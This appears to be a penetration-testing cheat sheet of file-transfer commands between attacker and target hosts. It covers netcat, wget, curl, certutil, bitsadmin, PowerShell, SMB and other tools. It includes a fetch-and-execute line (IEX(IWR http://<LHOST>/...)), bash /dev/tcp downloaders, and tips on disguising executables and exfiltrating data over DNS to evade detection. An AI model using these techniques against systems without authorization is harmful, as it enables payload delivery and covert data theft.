# File Transfer - commands

## File Transfer using Netcat (nc)
Netcat is a versatile utility that can transfer files directly over a TCP/UDP connection.

### On Linux (Act as Server):

Run the following to listen on port 4444:

```
nc -lvnp 4444 < file.txt
```
### On Windows (Receive the File):

Use the following to connect and save the file:

```
nc 192.168.1.100 4444 > C:\Users\Public\file.txt
```

## Impacket
```
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support
copy * \\<LHOST>\<SHARE>
```

## File Transfer using Wget
Wget is a command-line utility available by default on Linux and can be installed on Windows. It’s especially useful for downloading files over HTTP, HTTPS, or FTP.

### Linux to Linux or Linux to Windows:

Start a Python HTTP server on the Linux machine (explained in Section 13).

```
python3 -m http.server 8080
```

On the destination machine, download the file using wget:

```
wget http://192.168.1.100:8080/file.txt
```

### Windows with Wget Installed:

Install Wget on Windows if it’s not already available.

Run the following command:

```
wget http://192.168.1.100:8080/file.txt -OutFile C:\Users\Public\file.txt
```

### wget version
Paste directly to the shell.
```
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
__wget http://<LHOST>/<FILE>
```
## File Transfer using Curl
Curl supports various protocols, including HTTP, HTTPS, and FTP, and is pre-installed on Linux. On Windows, PowerShell includes a built-in alias for Curl.

### Linux to Linux or Linux to Windows:

Start a Python HTTP server on the source machine.

On the target, use Curl to download:

```
curl -O http://192.168.1.100:8080/file.txt
```

### Windows PowerShell:

Use the following command to download to a specified path:

```
curl -o C:\Users\Public\file.txt http://192.168.1.100:8080/file.txt
```

### curl version
```
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

## File Transfer using Certutil (Windows Only)
Certutil is a built-in Windows tool commonly used for managing certificates, but it also supports file downloads, making it ideal in restrictive environments.

Start a Python HTTP server on the Linux machine.

On the Windows target, use Certutil to download the file:

```
certutil -urlcache -f http://192.168.1.100:8080/file.txt C:\Users\Public\file.txt
```
Verify the file download by checking the destination directory.

## File Transfer using Bitsadmin (Windows Only)
BITSAdmin, another Windows utility, uses the Background Intelligent Transfer Service (BITS) to manage file downloads in the background.

On the Windows machine, open a PowerShell terminal.

Run the following command:

```
bitsadmin /transfer mydownload /download /priority normal http://192.168.1.100:8080/file.txt C:\Users\Public\file.txt
```
Check the Transfer Status:

```
bitsadmin /info mydownload /verbose
```

## File Transfer using PowerShell
PowerShell’s Invoke-WebRequest is another option for downloading files on Windows, useful for HTTP-based transfers.

Start a Python HTTP server on the source machine.

On the target Windows machine, use:

```
Invoke-WebRequest -Uri http://192.168.1.100:8080/file.txt -OutFile C:\Users\Public\file.txt
```
Or 
```
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

## File Transfer using SMB Server (Linux to Windows)
SMB (Server Message Block) is a network file-sharing protocol, and Linux machines can act as SMB servers using Samba.

### On Linux (Setting up the SMB Server):

Install Samba:

```
sudo apt-get install samba
```

Configure the smb.conf file to share a directory:

```
[share]
path = /path/to/share
browsable = yes
writable = yes
guest ok = yes
```

Restart Samba:

```
sudo systemctl restart smbd
```

### On Windows (Accessing the SMB Share):

Open PowerShell and map the SMB share:

```
net use Z: \\192.168.1.100\share /user:guest
```
Navigate to Z: and copy the file to your destination folder:

```
copy Z:\file.txt C:\Users\Public\file.txt
```

## File Transfer using SCP (Linux and Windows)
SCP (Secure Copy Protocol) is commonly used for secure file transfers over SSH.

### Linux to Linux:

Run SCP with a remote destination path:

```
scp file.txt user@192.168.1.101:/path/to/destination/
```

### Linux to Windows (using OpenSSH on Windows):

Open PowerShell and run:

```
scp file.txt user@192.168.1.101:"C:\Users\Public\file.txt"
```

## File Transfer using TFTP (Trivial File Transfer Protocol)
TFTP is a simple transfer protocol with limited functionality and no encryption, ideal for quick transfers in controlled networks.

### On Linux (TFTP Server):

Install and start a TFTP server:

```
sudo apt install tftp
sudo systemctl start tftpd
```
Place the file in the TFTP directory (e.g., /srv/tftp).

### On Windows (TFTP Client):

Use the TFTP client to get the file:

```
tftp -i 192.168.1.100 GET file.txt C:\Users\Public\file.txt
```

## File Transfer using FTP (File Transfer Protocol)
FTP is a more robust option but lacks encryption by default.

### On Linux (FTP Server):

Install and start an FTP server (e.g., vsftpd).

```
sudo apt install vsftpd
sudo systemctl start vsftpd
```
Place the file in the FTP directory (e.g., /srv/ftp).

### On Windows (FTP Client):

Open a PowerShell terminal and connect:

```
ftp 192.168.1.100
```
Download the file using get file.txt.

## File Transfer using HTTP Server
The Python HTTP server is quick and efficient for short-term file sharing over HTTP.

### On Linux (Start HTTP Server):

Start the server in the file directory:

```
python3 -m http.server 8080
```
### On Windows (Download via Browser or PowerShell):

Open a browser and navigate to http://192.168.1.100:8080/file.txt to download, or:

```
Invoke-WebRequest -Uri http://192.168.1.100:8080/file.txt -OutFile C:\Users\Public\file.txt
```

## File Transfer using Python SimpleHTTPServer (Python 2)
For legacy support, Python 2 has a built-in SimpleHTTPServer module.

Start the server on the source machine (Linux or Windows) by running:

```
python -m SimpleHTTPServer 8080
```
On the target machine, use your preferred method (e.g., wget, curl, browser) to download the file from http://192.168.1.100:8080/file.txt.

This approach works similarly to Python 3’s http.server, but keep in mind that Python 2 is deprecated and might not be available on all systems.

## Advanced Techniques for Secure and Stealthy File Transfer
Some situations call for more secure or stealthy file transfer methods to avoid detection. Here are a few advanced approaches:

Obfuscate File Names and Extensions: Rename sensitive files to non-suspicious names, or change extensions (e.g., file.exe to file.jpg) to avoid automated security detection.

Use Encryption: Encrypt files using tools like gpg on Linux before transfer to add an extra layer of security:

```
gpg -c file.txt # Encrypts with a passphrase
```
On the destination, decrypt with:

```
gpg file.txt.gpg
```
Encoded Transfers in PowerShell: If restricted, use base64 encoding to transfer text-based data:

```
$content = Get-Content C:\path\to\file.txt
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
Write-Output $encoded > encoded.txt
```

On the target, decode it:

```
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content encoded.txt))) | Out-File C:\path\to\decoded.txt
```
Data Exfiltration via DNS Tunneling: For highly covert transfers, encode data in DNS requests using tools like dnscat2 or iodine, though this is often limited by network restrictions.
